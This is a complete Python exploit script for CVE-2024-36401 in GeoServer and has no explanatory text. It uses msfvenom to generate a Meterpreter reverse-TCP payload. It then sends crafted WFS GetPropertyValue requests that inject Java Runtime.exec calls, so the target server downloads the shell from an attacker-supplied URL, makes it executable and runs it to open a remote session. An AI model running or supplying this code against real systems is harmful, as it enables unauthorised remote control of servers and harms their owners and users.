import requests
import sys
import os
import time

if len(sys.argv) != 5:
	print("Usage: geopwn.py <domain> <payload_URL> <LHOST> <LPORT>")
	sys.exit(1)

domain = sys.argv[1]
evilURL = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

print("""
=======================================
[!] Generating MSF Payload: shell
""")
makeShell = os.system(f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell")

# This is to make sure that msfvenom has time to generate the payload before moving on
time.sleep(3)

print(f"""

=======================================
[!] Attempting CVE-2024-36401 PoC
---------------------------------------
[*] Domain: http://{domain}/geoserver
[*] Evil-URL: http://{evilURL}
[*] LHOST: {lhost}
[*] LPORT: {lport}
=======================================

""")

getShell = (
f"http://{domain}:8080/geoserver/topp/wfs"
"?service=WFS"
"&version=2.0.0"
"&request=GetPropertyValue"
"&typeNames=topp%3Astates"
"&valueReference=exec(java.lang.Runtime.getRuntime()%2c"
f"'wget%20http://{evilURL}/shell')"
)

requests.get(getShell)
time.sleep(1)

setExec = (
f"http://{domain}:8080/geoserver/topp/wfs"
"?service=WFS"
"&version=2.0.0"
"&request=GetPropertyValue"
"&typeNames=topp%3Astates"
"&valueReference=exec(java.lang.Runtime.getRuntime()%2c"
"'chmod%20%2bx%20./shell')"
)

requests.get(setExec)

runShell = (
f"http://{domain}:8080/geoserver/topp/wfs"
"?service=WFS"
"&version=2.0.0"
"&request=GetPropertyValue"
"&typeNames=topp%3Astates"
"&valueReference=exec(java.lang.Runtime.getRuntime()%2c"
"'./shell')"
)


requests.get(runShell)

print("""
[!] Check for new session
""")
